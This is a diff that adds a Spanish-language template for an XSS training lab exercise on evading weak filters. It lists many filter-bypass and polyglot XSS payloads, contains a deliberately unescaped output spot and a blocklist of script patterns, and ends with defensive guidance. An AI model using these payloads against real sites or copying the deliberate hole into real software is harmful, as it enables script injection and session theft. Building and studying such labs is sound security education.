@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ejercicio 4: Bypass de Filtros XSS</title>
+    <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+    <!-- Header -->
+    <header class="header">
+        <div class="header-content">
+            <a href="/" class="logo">🔍 LAB XSS</a>
+            <nav>
+                <ul class="nav">
+                    <li><a href="/">← Volver al Inicio</a></li>
+                    <li><a href="/users">👥 Usuarios</a></li>
+                    <li><a href="/about">ℹ️ Acerca de</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+
+    <div class="container">
+        <h1 class="page-title">🔓 Ejercicio 4: Bypass de Filtros</h1>
+        <p class="page-subtitle">Evade filtros de seguridad débiles usando técnicas avanzadas</p>
+
+        <!-- Instructions -->
+        <div class="info-box">
+            <div class="info-title">📋 Instrucciones</div>
+            <p>Esta página intenta protegerse contra XSS usando filtros básicos. Tu objetivo es encontrar formas de evadirlos.</p>
+            <ul style="margin-top: 1rem; margin-left: 2rem; color: #8b949e;">
+                <li><strong style="color: #00d9ff;">Objetivo:</strong> Ejecutar JavaScript evadiendo los filtros</li>
+                <li><strong style="color: #00d9ff;">Tipo:</strong> Filter Bypass / WAF Evasion</li>
+                <li><strong style="color: #00d9ff;">Filtros activos:</strong> Bloquea &lt;script&gt;, javascript:, onerror (case-insensitive)</li>
+                <li><strong style="color: #00d9ff;">Desafío:</strong> Requiere creatividad y conocimiento de técnicas alternativas</li>
+            </ul>
+        </div>
+
+        <!-- Blocked Patterns Info -->
+        <div class="info-box danger">
+            <div class="info-title">🚫 Patrones Bloqueados</div>
+            <p>El sistema intenta bloquear estos patrones (pero puede ser evadido):</p>
+            <ul style="margin-top: 1rem; margin-left: 2rem; color: #8b949e;">
+                <li><code style="color: #ff4444;">&lt;script&gt;</code> - Etiqueta script</li>
+                <li><code style="color: #ff4444;">javascript:</code> - Protocolo JavaScript</li>
+                <li><code style="color: #ff4444;">onerror</code> - Evento onerror</li>
+            </ul>
+            <p style="margin-top: 1rem; color: #ffaa00;">⚠️ El filtro es case-insensitive pero tiene otras debilidades...</p>
+        </div>
+
+        <!-- Bypass Techniques -->
+        <div class="info-box success">
+            <div class="info-title">💡 Técnicas de Bypass Sugeridas</div>
+            <div style="margin-top: 1rem;">
+                <p style="color: #8b949e; margin-bottom: 0.5rem;"><strong>1. Case Variation (aunque el filtro sea case-insensitive):</strong></p>
+                <div class="code-block">
+                    <code>&lt;ScRiPt&gt;alert('Bypass')&lt;/ScRiPt&gt;</code>
+                </div>
+
+                <p style="color: #8b949e; margin-bottom: 0.5rem; margin-top: 1rem;"><strong>2. Eventos Alternativos:</strong></p>
+                <div class="code-block">
+                    <code>&lt;img src=x onload=alert('Bypass')&gt;</code>
+                </div>
+                <div class="code-block">
+                    <code>&lt;svg onload=alert('Bypass')&gt;</code>
+                </div>
+                <div class="code-block">
+                    <code>&lt;body onload=alert('Bypass')&gt;</code>
+                </div>
+                <div class="code-block">
+                    <code>&lt;input onfocus=alert('Bypass') autofocus&gt;</code>
+                </div>
+
+                <p style="color: #8b949e; margin-bottom: 0.5rem; margin-top: 1rem;"><strong>3. Codificación de Caracteres:</strong></p>
+                <div class="code-block">
+                    <code>&lt;img src=x on&#x6C;oad=alert('Bypass')&gt;</code>
+                </div>
+                <div class="code-block">
+                    <code>&lt;svg/onload=alert('Bypass')&gt;</code>
+                </div>
+
+                <p style="color: #8b949e; margin-bottom: 0.5rem; margin-top: 1rem;"><strong>4. Espacios y Caracteres Especiales:</strong></p>
+                <div class="code-block">
+                    <code>&lt;img/src=x/onload=alert('Bypass')&gt;</code>
+                </div>
+                <div class="code-block">
+                    <code>&lt;svg%20onload=alert('Bypass')&gt;</code>
+                </div>
+
+                <p style="color: #8b949e; margin-bottom: 0.5rem; margin-top: 1rem;"><strong>5. Fragmentación:</strong></p>
+                <div class="code-block">
+                    <code>&lt;scr&lt;script&gt;ipt&gt;alert('Bypass')&lt;/script&gt;</code>
+                </div>
+            </div>
+        </div>
+
+        <!-- Test Form -->
+        <div class="search-box">
+            <h2 style="color: #00d9ff; margin-bottom: 1.5rem;">🧪 Probar Bypass</h2>
+            <form method="GET" action="/bypass">
+                <div class="form-group">
+                    <label class="form-label">Mensaje (intentará ser filtrado):</label>
+                    <textarea name="message" class="form-textarea" 
+                              placeholder="Ingresa tu payload aquí...">{{ message }}</textarea>
+                </div>
+                <button type="submit" class="btn">Enviar Mensaje</button>
+            </form>
+        </div>
+
+        <!-- Results Section -->
+        {% if message %}
+        <div class="results-container">
+            <h3 style="color: #00d9ff; margin-bottom: 1rem;">📊 Resultado del Filtro</h3>
+            
+            {% if bypass_detected %}
+            <div class="info-box danger">
+                <div class="info-title">🚨 Patrón Malicioso Detectado</div>
+                <p>El sistema detectó un patrón bloqueado e intentó limpiarlo:</p>
+                <div class="code-block" style="margin-top: 1rem;">
+                    <code>Input Original: {{ message }}</code>
+                </div>
+                <div class="code-block">
+                    <code>Después del Filtro: {{ filtered_message }}</code>
+                </div>
+            </div>
+            {% else %}
+            <div class="info-box success">
+                <div class="info-title">✅ Mensaje Aceptado</div>
+                <p>El filtro no detectó patrones maliciosos. Mostrando mensaje:</p>
+            </div>
+            {% endif %}
+
+            <!-- ⚠️ VULNERABLE: Mostrando mensaje (potencialmente filtrado) -->
+            <div class="comment-card" style="margin-top: 1.5rem;">
+                <div class="comment-header">
+                    <span class="comment-author">Usuario de Prueba</span>
+                </div>
+                <div class="comment-body">
+                    {{ filtered_message if bypass_detected else message }}
+                </div>
+            </div>
+        </div>
+        {% endif %}
+
+        <!-- Educational Info -->
+        <div class="info-box warning" style="margin-top: 3rem;">
+            <div class="info-title">🎓 Explicación Técnica</div>
+            <p><strong>¿Por qué fallan los filtros simples?</strong></p>
+            <ul style="margin-top: 1rem; margin-left: 2rem; color: #8b949e;">
+                <li><strong>Blacklist incompleta:</strong> Imposible listar todos los vectores de ataque</li>
+                <li><strong>Parsing diferente:</strong> El navegador interpreta HTML de formas inesperadas</li>
+                <li><strong>Múltiples encodings:</strong> HTML entities, URL encoding, Unicode, etc.</li>
+                <li><strong>Mutación del DOM:</strong> El navegador puede "corregir" HTML y crear vulnerabilidades</li>
+                <li><strong>Context switching:</strong> Diferentes contextos (HTML, atributo, JavaScript) requieren diferentes sanitizaciones</li>
+            </ul>
+        </div>
+
+        <!-- Advanced Techniques -->
+        <div class="info-box" style="margin-top: 2rem;">
+            <div class="info-title">🚀 Técnicas Avanzadas de Bypass</div>
+            <div class="code-block" style="margin-top: 1rem;">
+                <code>// Bypass usando comentarios HTML
+&lt;!--&lt;script&gt;--&gt;&lt;script&gt;alert('Bypass')&lt;/script&gt;
+
+// Bypass con null bytes (en algunos contextos)
+&lt;scri%00pt&gt;alert('Bypass')&lt;/script&gt;
+
+// Bypass con new lines
+&lt;svg
+onload
+=alert('Bypass')&gt;
+
+// Bypass usando template literals
+&lt;img src=x onerror=`alert\x28'Bypass'\x29`&gt;
+
+// Polyglot XSS (funciona en múltiples contextos)
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('Bypass') )//
+
+// Bypass con doble codificación
+%253Cscript%253Ealert('Bypass')%253C/script%253E</code>
+            </div>
+        </div>
+
+        <!-- Real WAF Bypass -->
+        <div class="info-box" style="margin-top: 2rem;">
+            <div class="info-title">🛡️ Bypass de WAF Reales</div>
+            <p>Técnicas usadas para evadir Web Application Firewalls profesionales:</p>
+            <ul style="margin-top: 1rem; margin-left: 2rem; color: #8b949e;">
+                <li><strong>Mutation XSS (mXSS):</strong> Explotar diferencias en parsing</li>
+                <li><strong>HPP (HTTP Parameter Pollution):</strong> Enviar múltiples parámetros con el mismo nombre</li>
+                <li><strong>UTF-7 encoding:</strong> Codificación antigua pero a veces efectiva</li>
+                <li><strong>Polyglots:</strong> Payloads que funcionan en múltiples contextos</li>
+                <li><strong>WAF-specific quirks:</strong> Cada WAF tiene sus debilidades únicas</li>
+            </ul>
+            <div class="code-block" style="margin-top: 1rem;">
+                <code>// Ejemplo de polyglot XSS real
+'">>&lt;marquee&gt;&lt;img src=x onerror=confirm(1)&gt;&lt;/marquee&gt;"
+&lt;script&gt;confirm(1)&lt;/script&gt;&lt;isindex formaction=javascript:alert(/XSS/) type=submit&gt;'--&gt;
+&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;">&lt;img/id="confirm&#40;1&#41;"/alt="/"
+src="/"onerror=eval(id)&gt;'&gt;&lt;img src=`xx:xx`onerror=alert(1)&gt;</code>
+            </div>
+        </div>
+
+        <!-- Defense -->
+        <div class="info-box danger" style="margin-top: 2rem;">
+            <div class="info-title">🛡️ Defensa Correcta Contra XSS</div>
+            <ul style="margin-top: 1rem; margin-left: 2rem; color: #8b949e;">
+                <li><strong style="color: #ff4444;">NO usar blacklists:</strong> Usa whitelists y escape contextual</li>
+                <li><strong style="color: #ff4444;">Content Security Policy:</strong> La mejor defensa en profundidad</li>
+                <li><strong style="color: #ff4444;">Bibliotecas especializadas:</strong> DOMPurify, OWASP Java Encoder</li>
+                <li><strong style="color: #ff4444;">Escape contextual:</strong> Diferente para HTML, atributos, JavaScript, CSS</li>
+                <li><strong style="color: #ff4444;">HTTPOnly cookies:</strong> Prevenir robo de sesión</li>
+                <li><strong style="color: #ff4444;">Trusted Types:</strong> API del navegador para prevenir XSS</li>
+                <li><strong style="color: #ff4444;">Sanitización del servidor:</strong> Nunca confiar solo en el cliente</li>
+            </ul>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <p>🔐 Ejercicio 4: Bypass de Filtros | <a href="/" style="color: #00d9ff;">Volver al menú principal</a></p>
+    </footer>
+
+    <script>
+        // Mensaje educativo en consola
+        console.log('%c🔓 Ejercicio 4: Bypass de Filtros', 'color: #00ff41; font-size: 18px; font-weight: bold;');
+        console.log('%cEsta página tiene filtros XSS débiles que pueden ser evadidos', 'color: #ffaa00; font-size: 12px;');
+        console.log('%c⚠️  Filtros activos: <script>, javascript:, onerror', 'color: #ff4444; font-size: 12px;');
+        console.log('%c💡 Usa eventos alternativos, codificación, o fragmentación', 'color: #00d9ff; font-size: 12px;');
+
+        // Detectar si el mensaje actual fue filtrado
+        const urlParams = new URLSearchParams(window.location.search);
+        const message = urlParams.get('message');
+        
+        if (message) {
+            console.log('%cPayload recibido:', 'color: #00d9ff;', message);
+            
+            // Detectar patrones bloqueados
+            const blockedPatterns = ['<script>', 'javascript:', 'onerror'];
+            let blocked = false;
+            
+            blockedPatterns.forEach(pattern => {
+                if (message.toLowerCase().includes(pattern.toLowerCase())) {
+                    blocked = true;
+                    console.log(`%c⚠️  Patrón bloqueado detectado: ${pattern}`, 'color: #ff4444; font-size: 12px;');
+                }
+            });
+            
+            if (!blocked) {
+                console.log('%c✅ Payload pasó el filtro', 'color: #00ff41; font-size: 12px;');
+            }
+        }
+
+        // Override alert para mensajes educativos
+        const originalAlert = window.alert;
+        window.alert = function(message) {
+            console.log('%c🎉 ¡BYPASS EXITOSO!', 'color: #00ff41; font-size: 20px; font-weight: bold;');
+            console.log('%c✓ Has evadido los filtros de seguridad', 'color: #00ff41; font-size: 14px;');
+            console.log('%c💡 En WAFs reales, esto requiere mucha más sofisticación', 'color: #00d9ff; font-size: 12px;');
+            console.log('%c⚠️  Siempre usa escape contextual apropiado, no blacklists', 'color: #ffaa00; font-size: 12px;');
+            originalAlert('✅ ¡BYPASS EXITOSO!\n\n' + message + '\n\n¡Felicitaciones! Has evadido el filtro XSS.\n\nEsto demuestra por qué los filtros simples no son suficientes.');
+        };
+    </script>
+</body>
+</html>
